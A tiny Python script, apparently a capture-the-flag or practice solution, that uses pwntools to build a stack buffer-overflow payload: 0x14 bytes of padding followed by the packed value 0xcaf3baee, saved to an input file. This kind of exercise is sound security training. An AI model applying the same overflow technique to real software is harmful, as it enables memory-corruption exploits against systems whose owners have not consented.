# Import p32 from pwntools
from pwn import p32

# The Payload
payload = b"0"*0x14 + p32(0xcaf3baee) + b"\n"

# Write the payload to a file

input_file = open("input", "wb")

input_file.write(payload)
